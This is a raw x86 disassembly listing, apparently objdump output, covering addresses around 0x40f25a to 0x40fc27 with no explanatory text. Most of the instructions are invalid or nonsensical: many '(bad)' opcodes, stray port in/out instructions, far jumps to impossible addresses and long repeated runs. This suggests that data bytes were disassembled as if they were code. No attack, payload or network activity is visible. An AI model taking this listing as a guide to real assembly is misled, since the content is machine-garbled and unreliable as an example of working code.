  40f25a:	inc    ebx
  40f25b:	mov    bh,BYTE PTR [ebx+0xd809e]
	...
  40f285:	add    BYTE PTR [eax],al
  40f287:	add    bl,al
  40f289:	test   al,0x87
  40f28b:	and    al,0xb0
  40f28d:	xchg   BYTE PTR [ecx-0x1b],dl
  40f290:	fcom   st(3)
  40f292:	leave  
  40f293:	jmp    ebx
  40f295:	out    0xe7,eax
  40f297:	jmp    ebx
  40f299:	out    0xe7,eax
  40f29b:	jmp    ebx
  40f29d:	out    0xe7,eax
  40f29f:	jmp    ebx
  40f2a1:	out    0xe7,eax
  40f2a3:	jmp    esp
  40f2a5:	call   0xec29f192
  40f2aa:	jmp    0x40f2ab
  40f2ac:	in     al,dx
  40f2ad:	out    dx,eax
  40f2ae:	out    dx,al
  40f2af:	push   ecx
  40f2b1:	repz repz push esi
  40f2b5:	div    edi
  40f2b7:	(bad)  
  40f2b8:	cli    
  40f2b9:	cli    
  40f2ba:	cli    
  40f2bb:	(bad)  
  40f2bc:	cld    
  40f2bd:	cld    
  40f2be:	cld    
  40f2bf:	(bad)  
  40f2c0:	(bad)  
  40f2c2:	retf   
  40f2c3:	call   DWORD PTR [edx+ebp*2+0xb43a]
  40f2ca:	add    BYTE PTR [eax],al
  40f2cc:	add    BYTE PTR [eax],al
  40f2ce:	add    BYTE PTR [eax],al
  40f2d0:	sahf   
  40f2d1:	jl     0x40f328
  40f2d3:	stos   BYTE PTR es:[edi],al
  40f2d4:	(bad)  
  40f2d5:	shr    DWORD PTR [esi-0x392c1a01],0xff
  40f2dc:	in     eax,0xd2
  40f2de:	ret    
  40f2df:	jmp    ebx
  40f2e1:	rol    cl,1
  40f2e3:	jmp    edx
  40f2e5:	iret   
  40f2e6:	mov    edi,0xbdcde1ff
  40f2eb:	jmp    eax
  40f2ed:	retf   
  40f2ee:	mov    ebx,0xb8cadfff
  40f2f3:	(bad)  
  40f2f4:	mov    ebp,0x9dff83a0
  40f2f9:	js     0x40f34c
  40f2fb:	shl    BYTE PTR [edi+ecx*4-0x6f495394],1
  40f302:	ins    DWORD PTR es:[edi],dx
  40f303:	stos   BYTE PTR es:[edi],al
  40f304:	mov    ah,0x8e
  40f306:	imul   ebp,DWORD PTR [edx-0x5595714d],0xffffffb2
  40f30d:	mov    WORD PTR [edi-0x56],fs
  40f310:	mov    al,ds:0x97a94f79
  40f315:	outs   dx,DWORD PTR ds:[esi]
  40f316:	inc    esp
  40f317:	mov    al,BYTE PTR [eax]
	...
  40f325:	add    BYTE PTR [eax],al
  40f327:	add    ah,al
  40f329:	stos   BYTE PTR es:[edi],al
  40f32a:	mov    bl,BYTE PTR [edx]
  40f32c:	stos   DWORD PTR es:[edi],eax
  40f32d:	jp     0x40f36e
  40f32f:	mov    edi,0xffacc1cf
  40f334:	loop   0x40f31c
  40f336:	in     eax,0xff
  40f338:	jecxz  0x40f321
  40f33a:	out    0xff,eax
  40f33c:	jecxz  0x40f325
  40f33e:	out    0xff,eax
  40f340:	loop   0x40f328
  40f342:	out    0xff,al
  40f344:	loop   0x40f32c
  40f346:	out    0xfe,al
  40f348:	in     eax,0xe8
  40f34a:	call   0xec2cdc4e
  40f34f:	(bad)  
  40f350:	in     eax,dx
  40f351:	lock lock push ecx
  40f355:	repz repz push esi
  40f359:	div    edi
  40f35b:	push   edi
  40f35d:	div    dh
  40f35f:	dec    edi
  40f361:	mov    esi,0x6b95ffaa
  40f366:	cmp    al,BYTE PTR [ebp+0x0]
  40f36c:	add    BYTE PTR [eax],al
  40f36e:	add    BYTE PTR [eax],al
  40f370:	mov    eax,ds:0xd8aa597f
  40f375:	les    esi,FWORD PTR [ebx-0x35281801]
  40f37b:	jmp    esi
  40f37d:	(bad)  
  40f37e:	enter  0xe5ff,0xd4
  40f382:	(bad)  
  40f383:	jmp    esp
  40f385:	rol    esp,cl
  40f387:	jmp    ebx
  40f389:	rol    edx,1
  40f38b:	jmp    ebx
  40f38d:	rol    al,1
  40f38f:	jmp    edx
  40f391:	int    0xbd
  40f393:	(bad)  
  40f394:	fcmovnb st,st(5)
  40f396:	mov    bl,0xff
  40f398:	aad    0xbe
  40f39a:	test   eax,0xa9bfd7ff
  40f39f:	call   esi
  40f3a1:	mov    ebp,0xbbd5ffa7
  40f3a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3a7:	call   esp
  40f3a9:	mov    edx,0xb8d3ffa3
  40f3ae:	mov    eax,ds:0x46729bff
  40f3b3:	out    0x86,eax
  40f3b5:	pop    ebx
  40f3b6:	sub    DWORD PTR [ebp+0x0],ebx
	...
  40f3c5:	add    BYTE PTR [eax],al
  40f3c7:	add    ah,al
  40f3c9:	stos   DWORD PTR es:[edi],eax
  40f3ca:	mov    ecx,DWORD PTR [edx+eiz*4]
  40f3cd:	imul   esp,DWORD PTR [ecx+eax*4],0xf85b8cb4
  40f3d4:	(bad)  
  40f3d6:	leave  
  40f3d7:	jmp    edx
  40f3d9:	out    0xe6,al
  40f3db:	jmp    ebx
  40f3dd:	out    0xe7,eax
  40f3df:	jmp    edx
  40f3e1:	out    0xe6,al
  40f3e3:	jmp    edx
  40f3e5:	out    0xe6,al
  40f3e7:	(bad)  
  40f3e8:	jecxz  0x40f3d1
  40f3ea:	out    0xff,eax
  40f3ec:	in     al,0xe8
  40f3ee:	out    0xff,eax
  40f3f0:	call   0xed40dfe0
  40f3f5:	out    dx,al
  40f3f6:	out    dx,al
  40f3f7:	push   eax
  40f3f9:	repnz bnd call esi
  40f3fd:	enter  0xffb8,0x97
  40f401:	imul   esi,DWORD PTR [edi],0xfffffff3
  40f404:	cwde   
  40f405:	ins    DWORD PTR es:[edi],dx
  40f406:	cmp    bh,BYTE PTR ds:0x0
  40f40c:	add    BYTE PTR [eax],al
  40f40e:	add    BYTE PTR [eax],al
  40f410:	mov    ds:0xdaaa5d82,al
  40f415:	leave  
  40f416:	mov    eax,0xd0dceaff
  40f41b:	(bad)  
  40f41c:	jmp    0xe840c2fb
  40f421:	fmul   st,st(4)
  40f423:	jmp    edi
  40f425:	(bad)  
  40f426:	retf   0xe6ff
  40f429:	aad    0xc7
  40f42b:	jmp    ebp
  40f42d:	aam    0xc5
  40f42f:	jmp    esp
  40f431:	rol    bl,cl
  40f433:	jmp    ebx
  40f435:	rol    cl,1
  40f437:	jmp    edx
  40f439:	iret   
  40f43a:	mov    edi,0xbdcde1ff
  40f43f:	jmp    eax
  40f441:	retf   
  40f442:	mov    ebx,0xb8c9dfff
  40f447:	(bad)  
  40f448:	fadd   st,st(0)
  40f44a:	stos   DWORD PTR es:[edi],eax
  40f44b:	std    
  40f44c:	mov    ds:0x84d5547c,al
  40f451:	pop    ecx
  40f452:	sub    BYTE PTR [eax-0x4e],ah
  40f455:	xchg   ecx,eax
  40f456:	jo     0x40f459
	...
  40f468:	(bad)  
  40f469:	mov    al,0x93
  40f46b:	add    DWORD PTR [ebx-0x5dcdbe85],ebp
  40f471:	imul   esp,DWORD PTR [edi*4-0x58b6344],0xffd6dcdd
  40f47c:	jecxz  0x40f465
  40f47e:	out    0xff,eax
  40f480:	loop   0x40f468
  40f482:	out    0xff,al
  40f484:	loop   0x40f46c
  40f486:	out    0xfe,al
  40f488:	jecxz  0x40f471
  40f48a:	out    0xff,eax
  40f48c:	jecxz  0x40f475
  40f48e:	out    0xff,eax
  40f490:	in     al,0xe8
  40f492:	call   0xea2cdd96
  40f497:	(bad)  
  40f498:	fcmovbe st,st(2)
  40f49a:	(bad)  
  40f49d:	jge    0x40f4ed
  40f49f:	cmc    
  40f4a0:	nop
  40f4a1:	pop    ebp
  40f4a2:	and    al,0x9a
  40f4a4:	lods   eax,DWORD PTR ds:[esi]
  40f4a5:	mov    ah,BYTE PTR [edx+0x5]
	...
  40f4b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4b1:	test   BYTE PTR [eax-0x56],ah
  40f4b4:	fmul   st(4),st
  40f4b6:	mov    esp,0xd5dfecff
  40f4bb:	(bad)  
  40f4bc:	jmp    0x40f49c
  40f4be:	sar    edi,cl
  40f4c0:	jmp    0xceda:0xe9ffd1dc
  40f4c7:	(bad)  
  40f4c8:	call   0xe840c1a6
  40f4cd:	xlat   BYTE PTR ds:[ebx]
  40f4ce:	retf   0xe6ff
  40f4d1:	aad    0xc8
  40f4d3:	jmp    ebp
  40f4d5:	aam    0xc6
  40f4d7:	jmp    esp
  40f4d9:	rol    ah,cl
  40f4db:	jmp    ebx
  40f4dd:	rol    ecx,1
  40f4df:	jmp    edx
  40f4e1:	iret   
  40f4e2:	mov    edi,0xaec1d8ff
  40f4e7:	cld    
  40f4e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4e9:	sbb    DWORD PTR [ebx-0x27],0x691d507d
  40f4f0:	lods   eax,DWORD PTR ds:[esi]
  40f4f1:	mov    WORD PTR [eax+0xa],gs
	...
  40f50c:	(bad)  
  40f50d:	scas   eax,DWORD PTR es:[edi]
  40f50e:	nop
  40f50f:	or     ebp,DWORD PTR [ebp-0x5da3ba82]
  40f515:	imul   esp,DWORD PTR [esi+ecx*8],0xfb6f99bb
  40f51c:	fcmovbe st,st(5)
  40f51e:	int3   
  40f51f:	jmp    edx
  40f521:	out    0xe5,al
  40f523:	jmp    edx
  40f525:	out    0xe6,al
  40f527:	(bad)  
  40f528:	jecxz  0x40f511
  40f52a:	out    0xff,eax
  40f52c:	jecxz  0x40f515
  40f52e:	out    0xff,eax
  40f530:	loope  0x40f514
  40f532:	loopne 0x40f533
  40f534:	rol    bl,1
  40f536:	mov    cl,0xff
  40f538:	test   eax,0x94f45282
  40f53d:	pusha  
  40f53e:	and    al,0xb2
  40f540:	lods   al,BYTE PTR ds:[esi]
  40f541:	mov    BYTE PTR [esi+0x35],bl
	...
  40f550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f551:	xchg   DWORD PTR [ebx-0x56],esp
  40f554:	fmulp  st(7),st
  40f556:	sar    edi,0xed
  40f559:	loop   0x40f534
  40f55b:	(bad)  
  40f55c:	in     eax,dx
  40f55d:	loope  0x40f536
  40f55f:	(bad)  
  40f560:	in     al,dx
  40f561:	loopne 0x40f538
  40f563:	(bad)  
  40f564:	jmp    0x40f544
  40f566:	sar    edi,cl
  40f568:	jmp    0xcfdb:0xe9ffd1dc
  40f56f:	(bad)  
  40f570:	call   0xe840c34e
  40f575:	xlat   BYTE PTR ds:[ebx]
  40f576:	retf   
  40f577:	jmp    edi
  40f579:	(bad)  
  40f57a:	enter  0xe5ff,0xd5
  40f57e:	(bad)  
  40f57f:	(bad)  
  40f580:	(bad)  
  40f582:	mov    eax,0x5d83a6fb
  40f587:	iret   
  40f588:	mov    fs,WORD PTR [ebp+0x37]
  40f58b:	push   0xffffff9d
  40f58d:	js     0x40f5df
  40f58f:	adc    eax,0x0
	...
  40f5b0:	les    ebp,FWORD PTR [ebp+ecx*4+0x407bab0e]
  40f5b7:	push   edi
  40f5b8:	mov    ds:0xb3b92469,al
  40f5bd:	mov    ebx,DWORD PTR [ecx-0x1]
  40f5c0:	(bad)  
  40f5c1:	mov    bl,0x96
  40f5c3:	call   edi
  40f5c5:	ror    al,cl
  40f5c7:	(bad)  
  40f5c8:	fstp   st(5)
  40f5ca:	fdivr  st,st(7)
  40f5cc:	rol    ch,1
  40f5ce:	mov    ah,0xff
  40f5d0:	mov    ebp,0xa5ff7ea1
  40f5d5:	js     0x40f618
  40f5d7:	in     al,dx
  40f5d8:	cwde   
  40f5d9:	arpl   WORD PTR [esi+ebx*4],sp
  40f5dc:	lods   eax,DWORD PTR ds:[esi]
  40f5dd:	mov    BYTE PTR [edx+edi*1-0x35],bl
  40f5e1:	mov    ecx,0x4a2
	...
  40f5ee:	add    BYTE PTR [eax],al
  40f5f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5f1:	xchg   DWORD PTR [ebx-0x56],esp
  40f5f4:	loopne 0x40f5c8
  40f5f6:	(bad)  
  40f5f7:	push   eax
  40f5f9:	out    0xdd,al
  40f5fb:	(bad)  
  40f5fc:	out    dx,eax
  40f5fd:	in     al,0xdc
  40f5ff:	(bad)  
  40f600:	out    dx,al
  40f601:	jecxz  0x40f5dd
  40f603:	(bad)  
  40f604:	in     eax,dx
  40f605:	loop   0x40f5de
  40f607:	(bad)  
  40f608:	in     al,dx
  40f609:	loopne 0x40f5e1
  40f60b:	(bad)  
  40f60c:	jmp    0x40f5ec
  40f60e:	aam    0xff
  40f610:	jmp    0x40f5ef
  40f612:	sar    bh,cl
  40f614:	jmp    0xe940c5f4
  40f619:	fcmove st,st(5)
  40f61b:	jmp    edi
  40f61d:	fmul   st,st(3)
  40f61f:	jmp    DWORD PTR [ebp-0x7128a37e]
  40f625:	fs ss push esi
  40f628:	mov    ch,0x97
  40f62a:	ja     0x40f63b
	...
  40f654:	ret    
  40f655:	lods   al,BYTE PTR ds:[esi]
  40f656:	pop    DWORD PTR [edi]
  40f658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f659:	jae    0x40f68f
  40f65b:	and    BYTE PTR [edx-0x5984da96],ah
  40f661:	jno    0x40f693
  40f663:	mov    bh,0xa9
  40f665:	js     0x40f6a3
  40f667:	in     al,0xaa
  40f669:	jnp    0x40f6ab
  40f66b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f66d:	je     0x40f6a6
  40f66f:	fisub  DWORD PTR [eax-0x6360d496]
  40f675:	fs and al,0x58
  40f678:	stos   BYTE PTR es:[edi],al
  40f679:	adc    DWORD PTR [ebx+0x18],0xffffffc2
  40f67d:	lods   eax,DWORD PTR ds:[esi]
  40f67e:	xchg   esp,eax
  40f67f:	add    eax,DWORD PTR [eax]
	...
  40f68d:	add    BYTE PTR [eax],al
  40f68f:	add    BYTE PTR [esi-0x1d559c79],ah
  40f695:	aad    0xc8
  40f697:	push   ecx
  40f699:	jmp    0xffe0:0xe8f1ffe2
  40f6a0:	lock out 0xde,eax
  40f6a3:	push   eax
  40f6a5:	in     eax,0xdc
  40f6a7:	(bad)  
  40f6a8:	out    dx,al
  40f6a9:	jecxz  0x40f685
  40f6ab:	(bad)  
  40f6ac:	in     eax,dx
  40f6ad:	loop   0x40f687
  40f6af:	(bad)  
  40f6b0:	in     al,dx
  40f6b1:	loopne 0x40f689
  40f6b3:	(bad)  
  40f6b4:	in     al,dx
  40f6b5:	(bad)  
  40f6b7:	(bad)  
  40f6b8:	jmp    0x40f697
  40f6ba:	sar    bh,cl
  40f6bc:	stos   DWORD PTR es:[edi],eax
  40f6bd:	mov    DWORD PTR [ebp-0x21],esp
  40f6c0:	xchg   DWORD PTR [ebx+ebp*1+0x4c],ebx
  40f6c4:	mov    esp,0x884a0
	...
  40f72d:	add    BYTE PTR [eax],al
  40f72f:	add    BYTE PTR [esi-0x1b559b79],ah
  40f735:	xlat   BYTE PTR ds:[ebx]
  40f736:	int3   
  40f737:	push   esp
  40f739:	in     al,dx
  40f73a:	out    0xff,al
  40f73c:	repz jmp 0x40f724
  40f73f:	push   edx
  40f741:	jmp    0xffe1:0xe8f2ffe4
  40f748:	lock out 0xdf,eax
  40f74b:	push   eax
  40f74d:	out    0xdd,al
  40f74f:	(bad)  
  40f750:	out    dx,eax
  40f751:	in     al,0xdc
  40f753:	jmp    esi
  40f755:	fmul   st,st(4)
  40f757:	cld    
  40f758:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f759:	test   DWORD PTR [ecx-0x23],esp
  40f75c:	jle    0x40f7b0
  40f75e:	pop    ds
  40f75f:	pop    edi
	...
  40f7d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7d1:	xchg   DWORD PTR [edx+ebp*4-0x1a],esp
  40f7d5:	fcmove st,st(7)
  40f7d7:	push   esi
  40f7d9:	lock jmp 0x40f7db
  40f7dc:	cmc    
  40f7dd:	out    dx,al
  40f7de:	jmp    0xe82eece2
  40f7e3:	push   ebx
  40f7e5:	in     al,dx
  40f7e6:	out    0xff,al
  40f7e8:	bnd jmp 0x40f7cf
  40f7eb:	push   ecx
  40f7ed:	jmp    0xda27f7d3
  40f7f2:	int    0xfc
  40f7f4:	lods   eax,DWORD PTR ds:[esi]
  40f7f5:	mov    gs,WORD PTR [edi+edx*8-0x6b]
  40f7f9:	jo     0x40f841
  40f7fb:	pop    esi
  40f7fc:	popf   
  40f7fd:	jp     0x40f853
  40f7ff:	or     eax,0x0
	...
  40f870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f871:	xchg   DWORD PTR [edx+ebp*4-0x19],esp
  40f875:	fst    st(3)
  40f877:	push   edi
  40f879:	repnz out dx,al
  40f87b:	push   edi
  40f87d:	icebp  
  40f87e:	in     eax,dx
  40f87f:	push   esi
  40f881:	lock jmp 0x40f883
  40f884:	cmc    
  40f885:	out    dx,eax
  40f886:	jmp    0xecff:0xe8eef5ff
  40f88d:	loope  0x40f867
  40f88f:	std    
  40f890:	scas   eax,DWORD PTR es:[edi]
  40f891:	xchg   ecx,eax
  40f892:	jo     0x40f86f
  40f894:	xchg   DWORD PTR [esi+0x2f],ebx
  40f897:	ins    DWORD PTR es:[edi],dx
  40f898:	mov    edx,0x1187a2
	...
  40f90d:	add    BYTE PTR [eax],al
  40f90f:	add    BYTE PTR [esi+eax*4-0x2017559e],ah
  40f916:	aad    0xff
  40f918:	stc    
  40f919:	cmc    
  40f91a:	repnz (bad) 
  40f91c:	clc    
  40f91d:	hlt    
  40f91e:	lock push edi
  40f921:	repz out dx,eax
  40f923:	push   edi
  40f925:	repnz in eax,dx
  40f927:	push   esi
  40f929:	icebp  
  40f92a:	in     al,dx
  40f92b:	jmp    FWORD PTR [ebp-0x711f8f6f]
  40f931:	cmp    esp,DWORD PTR [bp+si-0x5d]
  40f935:	test   DWORD PTR [edx+0x17],esp
	...
  40f978:	cdq    
  40f979:	jne    0x40f9bc
  40f97b:	push   es
  40f97c:	xchg   esp,eax
  40f97d:	imul   esi,DWORD PTR ds:0x34689250,0x3466908c
  40f987:	mov    ecx,0xc834668f
  40f98c:	mov    fs,WORD PTR [ebp+0x34]
  40f98f:	scas   eax,DWORD PTR es:[edi]
  40f990:	lea    esp,[ebp+0x34]
  40f993:	je     0x40f921
  40f995:	gs xor eax,0x58849b32
  40f99b:	add    al,0x0
	...
  40f9ad:	add    BYTE PTR [eax],al
  40f9af:	add    BYTE PTR [ebx-0x16559f7c],ah
  40f9b5:	loope  0x40f98e
  40f9b7:	(bad)  
  40f9b8:	cli    
  40f9b9:	clc    
  40f9ba:	idiv   bh
  40f9bc:	cli    
  40f9bd:	div    ah
  40f9bf:	(bad)  
  40f9c0:	stc    
  40f9c1:	cmc    
  40f9c2:	repz (bad) 
  40f9c4:	clc    
  40f9c5:	hlt    
  40f9c6:	icebp  
  40f9c7:	push   DWORD PTR [ecx-0x5900896a]
  40f9cd:	xchg   BYTE PTR [ebx-0x9],ah
  40f9d0:	mov    dl,0x94
  40f9d2:	je     0x40f9b1
  40f9d4:	mov    eax,0xbdd57e9c
  40f9d9:	mov    ds:0xa2bcd488,eax
  40f9de:	xchg   esp,edx
  40f9e0:	mov    esp,0xbcd487a2
  40f9e5:	mov    ds:0xa1bbd486,al
  40f9ea:	xchg   ah,dl
  40f9ec:	mov    ebx,0xbbd485a1
  40f9f1:	mov    eax,ds:0xa0bbd485
  40f9f6:	test   esp,edx
  40f9f8:	mov    ebx,0xbbd485a1
  40f9fd:	mov    eax,ds:0xa1bbd485
  40fa02:	test   esp,edx
  40fa04:	(bad)  
  40fa05:	mov    bh,0xa9
  40fa07:	and    eax,DWORD PTR [eax]
  40fa09:	add    BYTE PTR [eax],al
  40fa0b:	add    BYTE PTR [eax],al
  40fa0d:	add    BYTE PTR [eax],al
  40fa0f:	add    BYTE PTR [edx-0x66f8895a],ch
  40fa15:	je     0x40fa54
  40fa17:	inc    edx
  40fa18:	nop
  40fa19:	pop    esi
  40fa1a:	and    al,0xa9
  40fa1c:	popf   
  40fa1d:	je     0x40fa64
  40fa1f:	(bad)  
  40fa20:	mov    edx,0xd4ff86a3
  40fa25:	int    0xc1
  40fa27:	(bad)  
  40fa28:	(bad)  
  40fa2a:	aam    0xff
  40fa2c:	enter  0xaabb,0xff
  40fa30:	stos   BYTE PTR es:[edi],al
  40fa31:	mov    WORD PTR [edx-0x1],gs
  40fa34:	lea    esp,[ebx+0x34]
  40fa37:	out    0x84,eax
  40fa39:	push   edi
  40fa3a:	and    al,0x8b
  40fa3c:	cdq    
  40fa3d:	test   DWORD PTR [eax+0x28],ebx
  40fa40:	mov    cl,0xae
  40fa42:	mov    BYTE PTR [edx],al
	...
  40fa50:	mov    ds:0xeaaa6186,eax
  40fa55:	jecxz  0x40fa30
  40fa57:	(bad)  
  40fa58:	cld    
  40fa59:	sti    
  40fa5a:	stc    
  40fa5b:	(bad)  
  40fa5c:	sti    
  40fa5d:	stc    
  40fa5e:	idiv   edi
  40fa60:	repz out dx,al
  40fa62:	jmp    0x83e0b266
  40fa67:	push   DWORD PTR [ebp-0x3c008165]
  40fa6d:	stos   DWORD PTR es:[edi],eax
  40fa6e:	xchg   edx,eax
  40fa6f:	inc    esp
  40fa71:	lods   eax,DWORD PTR ds:[esi]
  40fa72:	xchg   esp,eax
  40fa73:	inc    esp
  40fa75:	lods   eax,DWORD PTR ds:[esi]
  40fa76:	xchg   esp,eax
  40fa77:	inc    esp
  40fa79:	lods   eax,DWORD PTR ds:[esi]
  40fa7a:	xchg   esp,eax
  40fa7b:	inc    esp
  40fa7d:	lods   eax,DWORD PTR ds:[esi]
  40fa7e:	xchg   esp,eax
  40fa7f:	inc    esp
  40fa81:	lods   eax,DWORD PTR ds:[esi]
  40fa82:	xchg   esp,eax
  40fa83:	inc    esp
  40fa85:	lods   eax,DWORD PTR ds:[esi]
  40fa86:	xchg   esp,eax
  40fa87:	inc    esp
  40fa89:	lods   eax,DWORD PTR ds:[esi]
  40fa8a:	xchg   esp,eax
  40fa8b:	inc    esp
  40fa8d:	lods   eax,DWORD PTR ds:[esi]
  40fa8e:	xchg   esp,eax
  40fa8f:	inc    esp
  40fa91:	lods   eax,DWORD PTR ds:[esi]
  40fa92:	xchg   esp,eax
  40fa93:	inc    esp
  40fa95:	lods   eax,DWORD PTR ds:[esi]
  40fa96:	xchg   esp,eax
  40fa97:	inc    esp
  40fa99:	lods   eax,DWORD PTR ds:[esi]
  40fa9a:	xchg   esp,eax
  40fa9b:	inc    esp
  40fa9d:	lods   eax,DWORD PTR ds:[esi]
  40fa9e:	xchg   esp,eax
  40fa9f:	(bad)  
  40faa0:	mov    esp,0xc6ff86a2
  40faa5:	mov    ch,0xa7
  40faa7:	sub    al,BYTE PTR [eax]
  40faa9:	add    BYTE PTR [eax],al
  40faab:	add    BYTE PTR [ecx+ebp*4+0x7c9d0779],ch
  40fab2:	inc    ebx
  40fab3:	dec    esp
  40fab4:	xchg   esp,eax
  40fab5:	pusha  
  40fab6:	and    al,0xc2
  40fab8:	test   eax,0xe2fa5885
  40fabd:	fcmovnbe st,st(0)
  40fabf:	(bad)  
  40fac0:	clc    
  40fac1:	div    edi
  40fac3:	(bad)  
  40fac4:	cld    
  40fac5:	cld    
  40fac6:	cld    
  40fac7:	(bad)  
  40fac8:	std    
  40fac9:	std    
  40faca:	std    
  40facb:	(bad)  
  40facc:	std    
  40facd:	std    
  40face:	std    
  40facf:	push   edi
  40fad1:	hlt    
  40fad2:	icebp  
  40fad3:	dec    edi
  40fad5:	mov    edi,0x7096ffab
  40fada:	inc    ebp
  40fadb:	icebp  
  40fadc:	test   BYTE PTR [edi+0x24],dl
  40fadf:	mov    ds:0x285e8a9d,al
	...
  40faf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faf1:	mov    BYTE PTR [ebp-0x56],ah
  40faf4:	jmp    0x40fadb
  40faf6:	(bad)  
  40faf8:	std    
  40faf9:	cld    
  40fafa:	cld    
  40fafb:	push   ecx
  40fafd:	in     al,dx
  40fafe:	out    0xff,eax
  40fb00:	(bad)  
  40fb01:	mov    bl,0x9e
  40fb03:	call   ebp
  40fb05:	enter  0xffb9,0xf7
  40fb09:	cmc    
  40fb0a:	repnz (bad) 
  40fb0c:	(bad)  
  40fb0d:	(bad)  
  40fb0e:	(bad)  
  40fb0f:	(bad)  
  40fb10:	(bad)  
  40fb11:	(bad)  
  40fb12:	(bad)  
  40fb13:	(bad)  
  40fb14:	(bad)  
  40fb15:	(bad)  
  40fb16:	(bad)  
  40fb17:	(bad)  
  40fb18:	(bad)  
  40fb19:	(bad)  
  40fb1a:	(bad)  
  40fb1b:	(bad)  
  40fb1c:	(bad)  
  40fb1d:	(bad)  
  40fb1e:	(bad)  
  40fb1f:	(bad)  
  40fb20:	(bad)  
  40fb21:	(bad)  
  40fb22:	(bad)  
  40fb23:	(bad)  
  40fb24:	(bad)  
  40fb25:	(bad)  
  40fb26:	(bad)  
  40fb27:	(bad)  
  40fb28:	(bad)  
  40fb29:	(bad)  
  40fb2a:	(bad)  
  40fb2b:	(bad)  
  40fb2c:	(bad)  
  40fb2d:	(bad)  
  40fb2e:	(bad)  
  40fb2f:	(bad)  
  40fb30:	(bad)  
  40fb31:	(bad)  
  40fb32:	(bad)  
  40fb33:	(bad)  
  40fb34:	(bad)  
  40fb35:	(bad)  
  40fb36:	(bad)  
  40fb37:	(bad)  
  40fb38:	(bad)  
  40fb39:	(bad)  
  40fb3a:	(bad)  
  40fb3b:	(bad)  
  40fb3c:	(bad)  
  40fb3d:	(bad)  
  40fb3e:	(bad)  
  40fb3f:	call   eax
  40fb41:	mov    ebp,0xb4c5ffa9
  40fb46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb47:	sub    al,BYTE PTR [eax]
  40fb49:	add    BYTE PTR [eax],al
  40fb4b:	add    BYTE PTR [eax-0x67d4b981],ah
  40fb51:	arpl   WORD PTR [ecx+esi*4],sp
  40fb54:	mov    al,0x8c
  40fb56:	(bad)  
  40fb57:	clc    
  40fb58:	loop   0x40fb38
  40fb5a:	xlat   BYTE PTR ds:[ebx]
  40fb5b:	push   edx
  40fb5d:	hlt    
  40fb5e:	hlt    
  40fb5f:	push   edi
  40fb61:	idiv   eax
  40fb63:	(bad)  
  40fb64:	cli    
  40fb65:	cli    
  40fb66:	sti    
  40fb67:	(bad)  
  40fb68:	cld    
  40fb69:	cld    
  40fb6a:	cld    
  40fb6b:	(bad)  
  40fb6c:	std    
  40fb6d:	std    
  40fb6e:	std    
  40fb6f:	(bad)  
  40fb70:	std    
  40fb71:	std    
  40fb72:	std    
  40fb73:	(bad)  
  40fb74:	sti    
  40fb75:	cli    
  40fb76:	cli    
  40fb77:	(bad)  
  40fb78:	fcmove st,st(5)
  40fb7a:	mov    esi,0x457097ff
  40fb7f:	icebp  
  40fb80:	test   BYTE PTR [edi+0x24],dl
  40fb83:	mov    esp,DWORD PTR [edx+edx*4+0x46b]
  40fb8a:	add    BYTE PTR [eax],al
  40fb8c:	add    BYTE PTR [eax],al
  40fb8e:	add    BYTE PTR [eax],al
  40fb90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb91:	mov    DWORD PTR [esi-0x56],esp
  40fb94:	in     al,dx
  40fb95:	out    0xdf,al
  40fb97:	push   esi
  40fb99:	repz out dx,eax
  40fb9b:	inc    eax
  40fb9d:	lods   eax,DWORD PTR ds:[esi]
  40fb9e:	xchg   edi,eax
  40fb9f:	(bad)  
  40fba0:	mov    eax,0xd6ff94a5
  40fba5:	into   
  40fba6:	leave  
  40fba7:	(bad)  
  40fba8:	fcompp 
  40fbaa:	xlat   BYTE PTR ds:[ebx]
  40fbab:	(bad)  
  40fbac:	(bad)  
  40fbae:	fdivr  st,st(7)
  40fbb0:	(bad)  
  40fbb2:	fdivr  st,st(7)
  40fbb4:	(bad)  
  40fbb6:	fdivr  st,st(7)
  40fbb8:	(bad)  
  40fbba:	fdivr  st,st(7)
  40fbbc:	(bad)  
  40fbbe:	fdivr  st,st(7)
  40fbc0:	(bad)  
  40fbc2:	fdivr  st,st(7)
  40fbc4:	(bad)  
  40fbc6:	fdivr  st,st(7)
  40fbc8:	(bad)  
  40fbca:	fdivr  st,st(7)
  40fbcc:	fcompp 
  40fbce:	fdivr  st,st(7)
  40fbd0:	fcompp 
  40fbd2:	fdivr  st,st(7)
  40fbd4:	fcompp 
  40fbd6:	fdivr  st,st(7)
  40fbd8:	fcompp 
  40fbda:	fdivr  st,st(7)
  40fbdc:	fcompp 
  40fbde:	fdivr  st,st(7)
  40fbe0:	lds    esi,FWORD PTR [ecx-0x4c3b0064]
  40fbe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbe7:	sub    dh,BYTE PTR [edx-0x64f58359]
  40fbed:	gs and al,0x74
  40fbf0:	stos   DWORD PTR es:[edi],eax
  40fbf1:	adc    BYTE PTR [ecx-0xf],0xd7
  40fbf5:	iret   
  40fbf6:	ret    0xe8ff
  40fbf9:	jmp    0x40fbe6
  40fbfb:	(bad)  
  40fbfc:	call   0xc240e7ef
  40fc01:	loop   0x40fbc6
  40fc03:	dec    DWORD PTR [ebx+0x73fe8dcc]
  40fc09:	mov    edi,0xcf97ff75
  40fc0e:	cwde   
  40fc0f:	(bad)  
  40fc10:	fsub   st(6),st
  40fc12:	fdiv   st(7),st
  40fc14:	std    
  40fc15:	std    
  40fc16:	std    
  40fc17:	(bad)  
  40fc18:	sti    
  40fc19:	cli    
  40fc1a:	cli    
  40fc1b:	call   eax
  40fc1d:	mov    edi,0x648dffab
  40fc22:	xor    al,0xe7
  40fc24:	mov    gs,WORD PTR [eax+0x39]
  40fc27:	xor    al,BYTE PTR [eax]
